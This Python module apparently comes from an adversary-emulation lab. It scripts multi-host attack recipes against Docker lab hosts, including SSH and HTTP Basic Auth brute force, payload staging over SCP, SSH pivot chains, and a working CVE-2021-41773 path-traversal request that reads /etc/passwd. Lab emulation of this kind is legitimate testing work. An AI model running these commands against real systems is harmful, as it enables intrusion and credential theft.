"""Multi-host pivot execution recipes.

Sister module to :mod:`executor` but consumes a :class:`HostFleet` instead
of a single environment. Each recipe runs commands on the host declared
by the technique JSON via :meth:`HostFleet.run_shell_on` and produces a
:class:`TechniqueOutcome` with per-host evidence files.

The recipe map below is intentionally small; it ships the canonical
six-step pivot reference (``0.pivot_demo``). Adding more techniques is a
matter of writing one function and registering it.
"""

from __future__ import annotations

import json
import shlex
import time
from pathlib import Path

from .host_fleet import HostFleet
from .models import (
    ExecutionMode,
    FidelityLevel,
    Realization,
    TechniqueOutcome,
)


def _now() -> float:
    return time.monotonic()


# Edge HTTP service witness (Apache <-> Nginx): the pre-staged HTTP Basic Auth
# credential and the protected resource path. Declared in plain text so the
# Q3 (preconditions pre-staged) box of the rubric is auditable.
WEB_USER = "webadmin"
WEB_PASSWORD = "Lab-Web-2026!"
WEB_SECRET_PATH = "/secret/flag.txt"


def _ssh_credential(fleet: HostFleet, host_name: str) -> tuple[str, str]:
    """Return the password credential declared for ``host_name``.

    Execution must consume the materialized profile, not catalog constants.
    Otherwise a free-region credential perturbation can appear in the proof
    while the executor silently keeps using the canonical credential.
    """
    for host in fleet.sut.hosts or []:
        if host.name != host_name or host.composition is None:
            continue
        for credential in host.composition.credentials:
            if credential.kind == "password":
                return credential.user, credential.secret
    raise ValueError(f"{host_name}: no declared password credential")


def _ssh_options() -> str:
    return (
        "-o StrictHostKeyChecking=no -o ConnectTimeout=5 "
        "-o PreferredAuthentications=password -o PubkeyAuthentication=no"
    )


# Techniques that exercise a documented CVE surface declare their realization at the call
# site. Everything else runs a generic primitive: the lab reproduces the step's effect
# without the originally targeted product, and the fidelity rubric scores it from the
# recorded evidence rather than from this label.
DEFAULT_REALIZATION = Realization.generic_primitive


def _outcome_success(
    tid: str,
    evidence: list[str],
    notes: str,
    duration: float,
    *,
    realization: Realization = DEFAULT_REALIZATION,
) -> TechniqueOutcome:
    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.adapted,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.real_controlled,
        realization=realization,
        status="success",
        evidence_files=evidence,
        duration_sec=duration,
        notes=notes,
    )


def _outcome_failure(
    tid: str,
    evidence: list[str],
    notes: str,
    duration: float,
    *,
    realization: Realization = DEFAULT_REALIZATION,
) -> TechniqueOutcome:
    return TechniqueOutcome(
        technique_id=tid,
        declared_fidelity=FidelityLevel.adapted,
        executed_fidelity=FidelityLevel.inspired,
        declared_mode=ExecutionMode.real_controlled,
        executed_mode=ExecutionMode.naive_simulated,
        realization=realization,
        status="failure",
        evidence_files=evidence,
        duration_sec=duration,
        notes=notes,
    )


# ----------------------------------------------------------------------
# Per-technique recipes
# ----------------------------------------------------------------------

def _t1046_scan_target1(fleet: HostFleet, tid: str, run_dir: Path) -> TechniqueOutcome:
    start = _now()
    result = fleet.run_shell_on(
        "attacker",
        "nc -zv -w 3 target1 22 2>&1 | head -3",
        log_name="techniques/T1046_scan.log",
        timeout=30,
    )
    ok = ("open" in result.stdout.lower() or "succeeded" in result.stdout.lower()
          or "open" in result.stderr.lower() or "succeeded" in result.stderr.lower())
    if ok:
        return _outcome_success(tid, ["techniques/T1046_scan.log"],
                                 "nc port-probe target1:22 reported open",
                                 _now() - start)
    return _outcome_failure(tid, ["techniques/T1046_scan.log"],
                             f"nc probe failed: stdout={result.stdout[:100]} "
                             f"stderr={result.stderr[:100]}",
                             _now() - start)


def _t1110_001_guess(fleet: HostFleet, tid: str, run_dir: Path) -> TechniqueOutcome:
    start = _now()
    target_user, target_password = _ssh_credential(fleet, "target1")
    # The attacker iterates a tiny wordlist; one entry matches by
    # pre-staging. The auditable surface is the wordlist file + the
    # exit_code of the matching sshpass call.
    wordlist = f"Password1\nadmin\nletmein\n{target_password}\nguest\nubuntu"
    fleet.run_shell_on(
        "attacker",
        f"printf '{wordlist}\\n' > /tmp/wordlist.txt && wc -l /tmp/wordlist.txt",
        log_name="techniques/T1110.001_wordlist.log", timeout=10,
    )
    result = fleet.run_shell_on(
        "attacker",
        ("while IFS= read -r pw; do "
         f"sshpass -p \"$pw\" ssh {_ssh_options()} "
         f"{shlex.quote(target_user)}@target1 'echo MATCH' 2>/dev/null && "
         f"echo \"FOUND: $pw\" && exit 0; "
         "done < /tmp/wordlist.txt; echo FOUND_NONE; exit 1"),
        log_name="techniques/T1110.001_bruteforce.log", timeout=60,
    )
    if "FOUND:" in result.stdout:
        return _outcome_success(tid, ["techniques/T1110.001_wordlist.log",
                                       "techniques/T1110.001_bruteforce.log"],
                                 f"matched a password from a 6-entry wordlist",
                                 _now() - start)
    return _outcome_failure(tid, ["techniques/T1110.001_bruteforce.log"],
                             f"no password in the wordlist matched. "
                             f"stdout tail: {result.stdout[-200:]}",
                             _now() - start)


def _t1021_004_ssh_lateral(fleet: HostFleet, tid: str, run_dir: Path) -> TechniqueOutcome:
    start = _now()
    target_user, target_password = _ssh_credential(fleet, "target1")
    result = fleet.run_shell_on(
        "attacker",
        (f"sshpass -p {shlex.quote(target_password)} ssh {_ssh_options()} "
         f"{shlex.quote(target_user)}@target1 "
         f"'uname -a && id && hostname'"),
        log_name="techniques/T1021.004_ssh.log", timeout=30,
    )
    if result.ok and "target1" in result.stdout:
        return _outcome_success(tid, ["techniques/T1021.004_ssh.log"],
                                 "Real SSH session attacker->target1 with lab "
                                 "password; remote uname/id/hostname captured",
                                 _now() - start)
    return _outcome_failure(tid, ["techniques/T1021.004_ssh.log"],
                             f"SSH lateral failed: exit={result.exit_code} "
                             f"stderr={result.stderr[:200]}",
                             _now() - start)


def _t1083_ls_on_target1(fleet: HostFleet, tid: str, run_dir: Path) -> TechniqueOutcome:
    start = _now()
    result = fleet.run_shell_on(
        "target1",
        "ls -la /etc /home /var/log 2>&1 | head -25 && getent hosts target2",
        log_name="techniques/T1083_target1_discovery.log", timeout=15,
    )
    ok = result.ok and ("target2" in result.stdout)
    if ok:
        return _outcome_success(tid, ["techniques/T1083_target1_discovery.log"],
                                 "Filesystem enumeration on target1; resolved "
                                 "target2 via Docker DNS for the next hop",
                                 _now() - start)
    return _outcome_failure(tid, ["techniques/T1083_target1_discovery.log"],
                             f"ls on target1 failed or DNS missing: "
                             f"stdout={result.stdout[:200]}",
                             _now() - start)


def _t1570_scp_to_target2(fleet: HostFleet, tid: str, run_dir: Path) -> TechniqueOutcome:
    start = _now()
    target1_user, target1_password = _ssh_credential(fleet, "target1")
    target2_user, target2_password = _ssh_credential(fleet, "target2")
    # Build a tiny shell payload on the attacker, push to target2. Use a
    # heredoc to avoid the layered quoting that triggers the $(...) parser
    # in sh -c invocations. The payload itself uses backticks for
    # command-substitution portability.
    fleet.run_shell_on(
        "attacker",
        ("cat > /tmp/payload.sh <<'PAYLOAD_EOF'\n"
         "#!/bin/sh\n"
         "echo PAYLOAD_RAN_ON_target2_AT_`date -u +%FT%TZ`\n"
         "id\n"
         "hostname\n"
         "PAYLOAD_EOF\n"
         "chmod +x /tmp/payload.sh && sha256sum /tmp/payload.sh"),
        log_name="techniques/T1570_stage_payload.log", timeout=10,
    )
    first_hop = fleet.run_shell_on(
        "attacker",
        (f"sshpass -p {shlex.quote(target1_password)} scp {_ssh_options()} "
         f"/tmp/payload.sh {shlex.quote(target1_user)}@target1:/tmp/payload.sh "
         "&& echo FIRST_HOP_OK"),
        log_name="techniques/T1570_scp_attacker_to_target1.log", timeout=30,
    )
    second_hop = fleet.run_shell_on(
        "target1",
        (f"sshpass -p {shlex.quote(target2_password)} scp {_ssh_options()} "
         f"/tmp/payload.sh {shlex.quote(target2_user)}@target2:/tmp/payload.sh "
         "&& echo SECOND_HOP_OK"),
        log_name="techniques/T1570_scp_target1_to_target2.log", timeout=30,
    )
    if ("FIRST_HOP_OK" in first_hop.stdout
            and "SECOND_HOP_OK" in second_hop.stdout):
        return _outcome_success(tid, ["techniques/T1570_stage_payload.log",
                                       "techniques/T1570_scp_attacker_to_target1.log",
                                       "techniques/T1570_scp_target1_to_target2.log"],
                                 "Payload traversed attacker->target1->target2 "
                                 "using each host's declared credential",
                                 _now() - start)
    return _outcome_failure(
        tid,
        ["techniques/T1570_scp_attacker_to_target1.log",
         "techniques/T1570_scp_target1_to_target2.log"],
        f"two-hop SCP failed: first={first_hop.exit_code}, "
        f"second={second_hop.exit_code}; "
        f"second stderr={second_hop.stderr[:200]}",
                             _now() - start)


def _t1059_004_exec_on_target2(fleet: HostFleet, tid: str,
                                  run_dir: Path) -> TechniqueOutcome:
    start = _now()
    target2_user, target2_password = _ssh_credential(fleet, "target2")
    # SCP preserves mode in theory but the lab user's umask + ssh server
    # config sometimes drop the execute bit. Use `sh` to run the script
    # rather than relying on the +x bit — this also documents the choice
    # in the manifest evidence.
    result = fleet.run_shell_on(
        "target1",
        (f"sshpass -p {shlex.quote(target2_password)} ssh {_ssh_options()} "
         f"{shlex.quote(target2_user)}@target2 "
         f"'sh /tmp/payload.sh'"),
        log_name="techniques/T1059.004_remote_exec.log", timeout=30,
    )
    if result.ok and "PAYLOAD_RAN_ON_target2" in result.stdout and "target2" in result.stdout:
        return _outcome_success(tid, ["techniques/T1059.004_remote_exec.log"],
                                 "Pivot execution confirmed: target1 invoked "
                                 "the payload on target2, which returned its "
                                 "hostname",
                                 _now() - start)
    return _outcome_failure(tid, ["techniques/T1059.004_remote_exec.log"],
                             f"remote exec failed: exit={result.exit_code} "
                             f"stdout={result.stdout[:200]}",
                             _now() - start)


# ----------------------------------------------------------------------
# CVE-2021-41773 — Apache 2.4.49 path traversal exploitation
# ----------------------------------------------------------------------

# Canonical exploitation URL pattern from the Apache Security advisory.
# The leading /icons/ is the alias the vulnerable httpd.conf maps; the
# %2e segments URL-decode after path normalization, escaping DocumentRoot.
_CVE_2021_41773_PATH = "/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"


def _t1595_002_probe_apache_version(fleet: HostFleet, tid: str,
                                       run_dir: Path) -> TechniqueOutcome:
    """T1595.002 — confirm the target speaks Apache 2.4.49 via Server header."""
    start = _now()
    result = fleet.run_shell_on(
        "attacker",
        "curl -sS -D - http://target/ -o /dev/null | head -10",
        log_name="techniques/T1595.002_version_probe.log", timeout=15,
    )
    # A Server-header banner grab confirms the vulnerable build but does not
    # exploit it, so the realization is a generic primitive, not the CVE.
    if result.ok and "Apache/2.4.49" in (result.stdout + result.stderr):
        return _outcome_success(
            tid, ["techniques/T1595.002_version_probe.log"],
            "Server header confirms Apache/2.4.49 — the exact vulnerable build",
            _now() - start,
            realization=Realization.generic_primitive,
        )
    return _outcome_failure(
        tid, ["techniques/T1595.002_version_probe.log"],
        f"Server header did not confirm 2.4.49. stdout head: {result.stdout[:200]}",
        _now() - start,
        realization=Realization.generic_primitive,
    )


def _t1190_exploit_cve_2021_41773(fleet: HostFleet, tid: str,
                                     run_dir: Path) -> TechniqueOutcome:
    """T1190 — fire the canonical CVE-2021-41773 path-traversal request and
    confirm /etc/passwd contents are exfiltrated in the response body."""
    start = _now()
    result = fleet.run_shell_on(
        "attacker",
        (f"curl -sS --path-as-is 'http://target{_CVE_2021_41773_PATH}' "
         "-o /tmp/exploit_response.txt -w 'HTTP %{http_code}\\n' && "
         "echo --RESPONSE BODY-- && cat /tmp/exploit_response.txt | head -10 && "
         "echo --END BODY--"),
        log_name="techniques/T1190_path_traversal.log", timeout=15,
    )
    # The /etc/passwd inside the official httpd:2.4.49 image always has at
    # least the `root:x:0:0:` line plus `daemon`. Either is sufficient proof.
    leaked = ("root:x:0:0:" in result.stdout or "daemon:" in result.stdout)
    http_ok = "HTTP 200" in result.stdout
    if leaked and http_ok:
        return _outcome_success(
            tid, ["techniques/T1190_path_traversal.log"],
            "CVE-2021-41773 path-traversal succeeded; HTTP 200 returned and "
            "/etc/passwd content (root/daemon entries) leaked in body",
            _now() - start,
            realization=Realization.real_cve,
        )
    return _outcome_failure(
        tid, ["techniques/T1190_path_traversal.log"],
        f"Exploit did not return leaked /etc/passwd. http_ok={http_ok} "
        f"leaked={leaked} response head: {result.stdout[:200]}",
        _now() - start,
        realization=Realization.real_cve,
    )


def _t1083_enumerate_via_traversal(fleet: HostFleet, tid: str,
                                      run_dir: Path) -> TechniqueOutcome:
    """T1083 — re-use the traversal to enumerate other sensitive paths
    (/etc/hostname, /etc/issue, /etc/group). Documents the scope of the
    initial-access pivot."""
    start = _now()
    enumeration_targets = ("hostname", "issue", "group")
    enumeration_commands = []
    for etc_file in enumeration_targets:
        enumeration_commands.append(
            f"echo === /etc/{etc_file} === && "
            f"curl -sS --path-as-is "
            f"'http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/{etc_file}' "
            f"-o /tmp/etc_{etc_file}.txt -w 'http=%{{http_code}}\\n' && "
            f"head -3 /tmp/etc_{etc_file}.txt"
        )
    command = " && ".join(enumeration_commands)
    result = fleet.run_shell_on(
        "attacker", command,
        log_name="techniques/T1083_enumerate.log", timeout=30,
    )
    # We expect at least the hostname endpoint to have leaked the container
    # short hostname.
    if result.ok and "http=200" in result.stdout:
        return _outcome_success(
            tid, ["techniques/T1083_enumerate.log"],
            "Path-traversal re-used to enumerate /etc/{hostname,issue,group}; "
            "at least one returned HTTP 200 with content",
            _now() - start,
            realization=Realization.real_cve,
        )
    return _outcome_failure(
        tid, ["techniques/T1083_enumerate.log"],
        f"enumeration did not return HTTP 200. stdout head: {result.stdout[:200]}",
        _now() - start,
        realization=Realization.real_cve,
    )


def _t1005_exfil_passwd_to_attacker_disk(fleet: HostFleet, tid: str,
                                            run_dir: Path) -> TechniqueOutcome:
    """T1005 — persist the previously-leaked /etc/passwd as a collection
    artifact on the attacker filesystem."""
    start = _now()
    result = fleet.run_shell_on(
        "attacker",
        ("mkdir -p /loot && "
         "cp /tmp/exploit_response.txt /loot/target_etc_passwd.txt && "
         "wc -l /loot/target_etc_passwd.txt && "
         "sha256sum /loot/target_etc_passwd.txt"),
        log_name="techniques/T1005_loot.log", timeout=15,
    )
    # Collection persists already-leaked data on the attacker disk; it touches
    # no CVE surface, so the realization is a generic primitive, not real_cve.
    if result.ok and "loot" in result.stdout:
        return _outcome_success(
            tid, ["techniques/T1005_loot.log"],
            "Exfiltrated /etc/passwd persisted under /loot on the attacker; "
            "sha256 recorded for chain-of-custody",
            _now() - start,
            realization=Realization.generic_primitive,
        )
    return _outcome_failure(
        tid, ["techniques/T1005_loot.log"],
        f"loot persist failed: stdout={result.stdout[:200]}",
        _now() - start,
        realization=Realization.generic_primitive,
    )


# ----------------------------------------------------------------------
# Edge HTTP service witness (Apache <-> Nginx). The same HTTP Basic Auth
# attack chain runs against either web server; the substituted free element
# is the edge server itself, so both realizations execute it to completion.
# ----------------------------------------------------------------------

def _t1046_scan_webtarget(fleet: HostFleet, tid: str,
                          run_dir: Path) -> TechniqueOutcome:
    start = _now()
    result = fleet.run_shell_on(
        "attacker",
        "curl -s -o /dev/null -w '%{http_code}' -m 5 http://webtarget/secret/ ; echo",
        log_name="techniques/T1046_web_scan.log", timeout=20,
    )
    code = result.stdout.strip()
    # Any HTTP status (2xx/3xx/4xx, e.g. the 401 challenge) means the edge
    # service answered; a connection failure yields an empty/000 code.
    ok = code[:1] in ("2", "3", "4")
    if ok:
        return _outcome_success(tid, ["techniques/T1046_web_scan.log"],
                                 f"webtarget:80 answered HTTP {code}",
                                 _now() - start)
    return _outcome_failure(tid, ["techniques/T1046_web_scan.log"],
                             f"no HTTP response from webtarget:80 (got {code!r})",
                             _now() - start)


def _t1110_001_web_guess(fleet: HostFleet, tid: str,
                         run_dir: Path) -> TechniqueOutcome:
    start = _now()
    # The attacker iterates a tiny wordlist; one entry matches by pre-staging.
    wordlist = ("Password1\nadmin\nletmein\n" + WEB_PASSWORD + "\nguest\nubuntu")
    fleet.run_shell_on(
        "attacker",
        f"printf '{wordlist}\\n' > /tmp/web_wordlist.txt && wc -l /tmp/web_wordlist.txt",
        log_name="techniques/T1110.001_web_wordlist.log", timeout=10,
    )
    result = fleet.run_shell_on(
        "attacker",
        ("while IFS= read -r pw; do "
         "code=$(curl -s -o /dev/null -w '%{http_code}' -m 5 "
         f"-u {WEB_USER}:\"$pw\" http://webtarget{WEB_SECRET_PATH}); "
         "if [ \"$code\" = \"200\" ]; then echo \"FOUND: $pw\"; exit 0; fi; "
         "done < /tmp/web_wordlist.txt; echo FOUND_NONE; exit 1"),
        log_name="techniques/T1110.001_web_bruteforce.log", timeout=60,
    )
    if "FOUND:" in result.stdout:
        return _outcome_success(tid, ["techniques/T1110.001_web_wordlist.log",
                                       "techniques/T1110.001_web_bruteforce.log"],
                                 "matched the HTTP Basic Auth password from a "
                                 "6-entry wordlist",
                                 _now() - start)
    return _outcome_failure(tid, ["techniques/T1110.001_web_bruteforce.log"],
                             "no wordlist entry authenticated. "
                             f"tail: {result.stdout[-200:]}",
                             _now() - start)


def _t1078_web_valid_accounts(fleet: HostFleet, tid: str,
                              run_dir: Path) -> TechniqueOutcome:
    start = _now()
    result = fleet.run_shell_on(
        "attacker",
        ("curl -s -o /dev/null -w '%{http_code}' -m 5 "
         f"-u {WEB_USER}:{WEB_PASSWORD} http://webtarget{WEB_SECRET_PATH}; echo"),
        log_name="techniques/T1078_web_auth.log", timeout=20,
    )
    if result.stdout.strip() == "200":
        return _outcome_success(tid, ["techniques/T1078_web_auth.log"],
                                 "authenticated to the protected resource with "
                                 "the recovered credentials (HTTP 200)",
                                 _now() - start)
    return _outcome_failure(tid, ["techniques/T1078_web_auth.log"],
                             "authenticated request did not return 200 "
                             f"(got {result.stdout.strip()!r})",
                             _now() - start)


def _t1005_web_exfil(fleet: HostFleet, tid: str,
                     run_dir: Path) -> TechniqueOutcome:
    start = _now()
    result = fleet.run_shell_on(
        "attacker",
        (f"curl -s -m 5 -u {WEB_USER}:{WEB_PASSWORD} "
         f"http://webtarget{WEB_SECRET_PATH} | tee /tmp/web_loot.txt; echo"),
        log_name="techniques/T1005_web_exfil.log", timeout=20,
    )
    if "LAB-WEB-SECRET" in result.stdout:
        return _outcome_success(tid, ["techniques/T1005_web_exfil.log"],
                                 "exfiltrated the protected secret over the "
                                 "authenticated HTTP channel",
                                 _now() - start)
    return _outcome_failure(tid, ["techniques/T1005_web_exfil.log"],
                             "secret not present in the response body. "
                             f"tail: {result.stdout[-160:]}",
                             _now() - start)


# Recipe name -> callable. Lookup is driven by the campaign JSON's `recipe`
# field so adding a technique is a 2-line change (function + registry).
_RECIPE_REGISTRY = {
    # Edge HTTP service witness (Apache <-> Nginx)
    "scan_webtarget_http": _t1046_scan_webtarget,
    "guess_web_basic_auth": _t1110_001_web_guess,
    "web_valid_accounts": _t1078_web_valid_accounts,
    "web_exfil_secret": _t1005_web_exfil,
    "scan_target1_ssh": _t1046_scan_target1,
    "guess_target1_password": _t1110_001_guess,
    "ssh_lateral_to_target1": _t1021_004_ssh_lateral,
    "ls_on_target1": _t1083_ls_on_target1,
    "scp_payload_to_target2": _t1570_scp_to_target2,
    "ssh_exec_payload_on_target2": _t1059_004_exec_on_target2,
    # CVE-2021-41773 reference
    "probe_apache_version": _t1595_002_probe_apache_version,
    "exploit_cve_2021_41773": _t1190_exploit_cve_2021_41773,
    "enumerate_via_traversal": _t1083_enumerate_via_traversal,
    "exfil_passwd_to_attacker_disk": _t1005_exfil_passwd_to_attacker_disk,
    # Topology / DMZ segmentation reference
    "topology_attacker_reaches_nginx": None,  # set below
    "topology_attacker_cannot_reach_db": None,
    "topology_pivot_nginx_to_app_server": None,
    "topology_pivot_app_server_to_db": None,
}


# ----------------------------------------------------------------------
# 0.dmz_segmentation_demo recipes
# ----------------------------------------------------------------------

_LAB_PASSWORD = "Zone-Demo-2026!"
_LAB_USER = "labuser"


def _ssh_pivot_command(jump_chain: list[str], final_command: str) -> str:
    """Build a nested SSH command that pivots through a chain of hosts.

    ``sshpass`` cannot inject the password into ProxyJump intermediates
    (it only intercepts the first prompt of one ssh call). Instead we
    nest ``ssh`` invocations so each hop runs its own ``sshpass`` against
    the next hop's listening sshd. This requires ``sshpass`` to be
    present on every intermediate host — which is true here because the
    ``autosut/dmz-host:s28`` baked image installs it.

    ``jump_chain[-1]`` is the host where ``final_command`` runs;
    ``jump_chain[:-1]`` are intermediate hops.
    """
    opts = ("-o StrictHostKeyChecking=no -o ConnectTimeout=5 "
            "-o PreferredAuthentications=password "
            "-o PubkeyAuthentication=no")

    def ssh_wrap(host: str, inner_command: str) -> str:
        return (f"sshpass -p '{_LAB_PASSWORD}' ssh {opts} "
                f"{_LAB_USER}@{host} \"{inner_command}\"")

    if len(jump_chain) == 1:
        return (f"sshpass -p '{_LAB_PASSWORD}' ssh {opts} "
                f"{_LAB_USER}@{jump_chain[0]} '{final_command}'")
    # Build the innermost call first, then wrap outward through the chain
    # in reverse. The outermost call runs from the attacker; each layer
    # invokes ssh against the next hop. We escape quotes via alternation
    # since the wrap inserts double quotes per layer.
    chain_reversed = list(reversed(jump_chain))
    command = final_command
    for host in chain_reversed[:-1]:
        # Each wrap adds an outer layer of ssh. The inner command becomes
        # the remote command on `host`.
        command = ssh_wrap(host, command)
    # Final outer call — from the attacker, ssh to the first hop. The
    # inner command is the entire nested chain above.
    first_hop = chain_reversed[-1]
    return (f"sshpass -p '{_LAB_PASSWORD}' ssh {opts} "
            f"{_LAB_USER}@{first_hop} \"{command}\"")


def _t1018_topology_attacker_reaches_nginx(fleet: HostFleet, tid: str,
                                              run_dir: Path) -> TechniqueOutcome:
    """T1018 — confirm the attacker has L2 reachability to nginx."""
    start = _now()
    result = fleet.run_shell_on(
        "attacker",
        "nc -zv -w 3 nginx 22 2>&1 | head -3",
        log_name="techniques/T1018_attacker_to_nginx.log",
        timeout=15,
    )
    output_text = (result.stdout + " " + result.stderr).lower()
    if "open" in output_text or "succeeded" in output_text:
        return _outcome_success(
            tid, ["techniques/T1018_attacker_to_nginx.log"],
            "Attacker (internet_edge zone) reached nginx:22 — both hosts "
            "share the internet_edge Docker network",
            _now() - start,
        )
    return _outcome_failure(
        tid, ["techniques/T1018_attacker_to_nginx.log"],
        f"attacker could not reach nginx:22 ({result.stdout[:120]} "
        f"/ {result.stderr[:120]})",
        _now() - start,
    )


def _t1135_topology_attacker_cannot_reach_db(fleet: HostFleet, tid: str,
                                                run_dir: Path) -> TechniqueOutcome:
    """T1135 — confirm the attacker has NO L2 path to db.

    This is the topology-enforcement claim: we declared segmentation
    (attacker in internet_edge only, db in enterprise only). Docker
    materialised that as two non-overlapping bridge networks. The probe
    MUST fail; a success here would mean segmentation broke.
    """
    start = _now()
    result = fleet.run_shell_on(
        "attacker",
        "nc -zv -w 3 db 22 2>&1; echo exit=$?",
        log_name="techniques/T1135_attacker_to_db_blocked.log",
        timeout=15,
    )
    text = result.stdout + " " + result.stderr
    blocked = ("exit=0" not in result.stdout
               or "name" in text.lower() and "not" in text.lower()
               or "no route" in text.lower()
               or "name does not resolve" in text.lower()
               or "name or service not known" in text.lower())
    if blocked:
        return _outcome_success(
            tid, ["techniques/T1135_attacker_to_db_blocked.log"],
            "Attacker (internet_edge) was blocked from db (enterprise) at "
            "L2 — Docker zone segmentation held. Output preserved for audit.",
            _now() - start,
        )
    return _outcome_failure(
        tid, ["techniques/T1135_attacker_to_db_blocked.log"],
        "Topology violation: attacker reached db without going through "
        "the dmz/enterprise gateways. Output: "
        f"{result.stdout[:200]} stderr={result.stderr[:200]}",
        _now() - start,
    )


def _t1021_topology_pivot_nginx_to_app_server(fleet: HostFleet, tid: str,
                                                  run_dir: Path) -> TechniqueOutcome:
    """T1021.004 — from the attacker, pivot SSH through nginx to app_server.

    Demonstrates that the attacker cannot reach app_server directly (it's
    not in internet_edge) but CAN reach it via nginx (which is in dmz).
    """
    start = _now()
    pivot_cmd = _ssh_pivot_command(["nginx", "app_server"],
                                     "hostname && id")
    result = fleet.run_shell_on(
        "attacker", pivot_cmd,
        log_name="techniques/T1021_pivot_to_app_server.log",
        timeout=30,
    )
    if result.ok and "app_server" in result.stdout:
        return _outcome_success(
            tid, ["techniques/T1021_pivot_to_app_server.log"],
            "Pivoted attacker -> nginx -> app_server via SSH ProxyJump. "
            "Remote uname reports app_server hostname.",
            _now() - start,
        )
    return _outcome_failure(
        tid, ["techniques/T1021_pivot_to_app_server.log"],
        f"Pivot failed: exit={result.exit_code} "
        f"stderr={result.stderr[:200]}",
        _now() - start,
    )


def _t1210_topology_pivot_app_server_to_db(fleet: HostFleet, tid: str,
                                              run_dir: Path) -> TechniqueOutcome:
    """T1210 — from the attacker, pivot through nginx and app_server to
    reach db (the enterprise-only host)."""
    start = _now()
    pivot_cmd = _ssh_pivot_command(["nginx", "app_server", "db"],
                                     "hostname && id")
    result = fleet.run_shell_on(
        "attacker", pivot_cmd,
        log_name="techniques/T1210_pivot_to_db.log",
        timeout=45,
    )
    if result.ok and "db" in result.stdout:
        return _outcome_success(
            tid, ["techniques/T1210_pivot_to_db.log"],
            "Pivoted attacker -> nginx -> app_server -> db via SSH "
            "ProxyJump chain. Final hostname confirms db reached.",
            _now() - start,
        )
    return _outcome_failure(
        tid, ["techniques/T1210_pivot_to_db.log"],
        f"Final-hop pivot failed: exit={result.exit_code} "
        f"stderr={result.stderr[:200]}",
        _now() - start,
    )


# Late-binding registration so the forward references at registry creation
# time resolve to the actual callables (defined above).
_RECIPE_REGISTRY.update({
    "topology_attacker_reaches_nginx": _t1018_topology_attacker_reaches_nginx,
    "topology_attacker_cannot_reach_db": _t1135_topology_attacker_cannot_reach_db,
    "topology_pivot_nginx_to_app_server": _t1021_topology_pivot_nginx_to_app_server,
    "topology_pivot_app_server_to_db": _t1210_topology_pivot_app_server_to_db,
})


def execute_multi_host(campaign_id: str, fleet: HostFleet,
                       run_dir: Path) -> list[TechniqueOutcome]:
    """Walk the campaign JSON and dispatch each technique to its recipe.

    Each technique entry must carry a ``recipe`` key naming a function in
    :data:`_RECIPE_REGISTRY`. The orchestrator validates the registry up
    front so a typo surfaces immediately rather than mid-run.
    """
    campaign_path = (Path(__file__).resolve().parents[2]
                     / "campaigns" / f"{campaign_id}.json")
    spec = json.loads(campaign_path.read_text(encoding="utf-8"))
    _execute_context_contract(spec, fleet, run_dir)
    outcomes: list[TechniqueOutcome] = []
    for tech in spec.get("techniques", []):
        tid = tech["technique_id"]
        recipe = tech.get("recipe", "")
        fn = _RECIPE_REGISTRY.get(recipe)
        if fn is None:
            outcomes.append(_outcome_failure(
                tid, [], f"no multi-host recipe registered for {recipe!r}", 0.0,
            ))
            continue
        outcomes.append(fn(fleet, tid, run_dir))
    return outcomes


def _execute_context_contract(
    spec: dict,
    fleet: HostFleet,
    run_dir: Path,
) -> None:
    """Execute declared benign background activities before attack steps."""

    activities = spec.get("context_contract", {}).get("background_activities", [])
    observations: list[dict] = []
    for activity in activities:
        if activity.get("recipe") != "bounded_tcp_observation":
            raise ValueError(
                f"unsupported context recipe {activity.get('recipe')!r}"
            )
        activity_id = str(activity["activity_id"])
        source_host = str(activity["source_host"])
        destination_host = str(activity["destination_host"])
        port = int(activity["port"])
        payload = str(activity["payload"])
        capture_path = f"/tmp/autosut_context_{activity_id}.json"
        evidence_prefix = f"context/{activity_id}"
        fleet.run_shell_on(
            destination_host,
            f"rm -f {shlex.quote(capture_path)}; "
            f"nohup sh -c 'nc -l -p {port} > {shlex.quote(capture_path)}' "
            f">/tmp/{activity_id}_listener.log 2>&1 &",
            log_name=f"{evidence_prefix}_listener.log",
            timeout=15,
        )
        time.sleep(1)
        sender = fleet.run_shell_on(
            source_host,
            f"printf '%s\\n' {shlex.quote(payload)} | "
            f"nc -w 5 {shlex.quote(destination_host)} {port}",
            log_name=f"{evidence_prefix}_sender.log",
            timeout=15,
        )
        verifier = fleet.run_shell_on(
            destination_host,
            f"for attempt in 1 2 3 4 5; do "
            f"test -s {shlex.quote(capture_path)} && break; sleep 1; done; "
            f"cat {shlex.quote(capture_path)}",
            log_name=f"{evidence_prefix}_verify.log",
            timeout=15,
        )
        success = (
            sender.ok
            and verifier.ok
            and payload in verifier.stdout
        )
        observations.append(
            {
                "activity_id": activity_id,
                "source_host": source_host,
                "destination_host": destination_host,
                "protocol": str(activity["protocol"]),
                "port": port,
                "purpose": str(activity["purpose"]),
                "status": "success" if success else "failure",
                "evidence_files": [
                    f"{evidence_prefix}_listener.log",
                    f"{evidence_prefix}_sender.log",
                    f"{evidence_prefix}_verify.log",
                ],
            }
        )
    if not observations:
        return
    context_path = run_dir / "context" / "context_observations.json"
    context_path.parent.mkdir(parents=True, exist_ok=True)
    context_path.write_text(
        json.dumps(observations, indent=2) + "\n",
        encoding="utf-8",
    )
    failed = [
        observation["activity_id"]
        for observation in observations
        if observation["status"] != "success"
    ]
    if failed:
        raise RuntimeError(
            "declared context activities failed: " + ", ".join(failed)
        )
